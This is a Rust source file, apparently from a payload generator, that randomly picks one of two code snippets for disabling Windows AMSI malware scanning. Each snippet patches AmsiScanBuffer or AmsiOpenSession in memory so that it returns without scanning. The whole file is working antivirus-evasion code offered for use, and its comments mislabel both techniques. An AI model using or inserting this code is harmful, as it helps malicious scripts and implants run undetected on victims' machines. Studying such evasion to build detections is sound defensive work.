use rand::Rng;

pub fn select_amsi_bypass(rng: &mut impl Rng) -> String {
    match rng.gen_range(0..2) {
        0 => amsi_bypass_iat_patch(),
        1 => amsi_bypass_com_hook(),
        _ => unreachable!(),
    }
}

fn amsi_bypass_iat_patch() -> String {
    r#"    // AMSI bypass: IAT patching approach
    {
        use windows_sys::Win32::System::LibraryLoader::*;
        use windows_sys::Win32::System::Memory::*;
        use std::ffi::c_void;

        unsafe {
            let amsi_name: Vec<u16> = "amsi.dll".encode_utf16().chain(std::iter::once(0)).collect();
            let amsi_mod = LoadLibraryW(amsi_name.as_ptr());
            if !amsi_mod.is_null() {
                let stub_bytes: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
                let stub_mem = VirtualAlloc(
                    std::ptr::null(),
                    stub_bytes.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if !stub_mem.is_null() {
                    std::ptr::copy_nonoverlapping(
                        stub_bytes.as_ptr(),
                        stub_mem as *mut u8,
                        stub_bytes.len(),
                    );

                    let proc_name = b"AmsiScanBuffer\0";
                    let original_addr = GetProcAddress(amsi_mod, proc_name.as_ptr());
                    if let Some(orig) = original_addr {
                        let target = orig as *mut u8;
                        let mut old_protect = 0u32;
                        VirtualProtect(
                            target as *const c_void,
                            6,
                            PAGE_EXECUTE_READWRITE,
                            &mut old_protect,
                        );
                        std::ptr::copy_nonoverlapping(
                            stub_bytes.as_ptr(),
                            target,
                            stub_bytes.len(),
                        );
                        let mut tmp = 0u32;
                        VirtualProtect(
                            target as *const c_void,
                            6,
                            old_protect,
                            &mut tmp,
                        );
                    }
                }
            }
        }
    }"#
    .to_string()
}

fn amsi_bypass_com_hook() -> String {
    r#"    // AMSI bypass: COM interface vtable hook
    {
        use windows_sys::Win32::System::LibraryLoader::*;
        use windows_sys::Win32::System::Memory::*;
        use std::ffi::c_void;

        unsafe {
            let amsi_name: Vec<u16> = "amsi.dll".encode_utf16().chain(std::iter::once(0)).collect();
            let amsi_mod = LoadLibraryW(amsi_name.as_ptr());
            if !amsi_mod.is_null() {
                let proc_name = b"AmsiOpenSession\0";
                if let Some(target_fn) = GetProcAddress(amsi_mod, proc_name.as_ptr()) {
                    let target = target_fn as *mut u8;
                    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];

                    let mut old_protect = 0u32;
                    VirtualProtect(
                        target as *const c_void,
                        patch.len(),
                        PAGE_EXECUTE_READWRITE,
                        &mut old_protect,
                    );

                    std::ptr::copy_nonoverlapping(
                        patch.as_ptr(),
                        target,
                        patch.len(),
                    );

                    let mut tmp = 0u32;
                    VirtualProtect(
                        target as *const c_void,
                        patch.len(),
                        old_protect,
                        &mut tmp,
                    );
                }
            }
        }
    }"#
    .to_string()
}
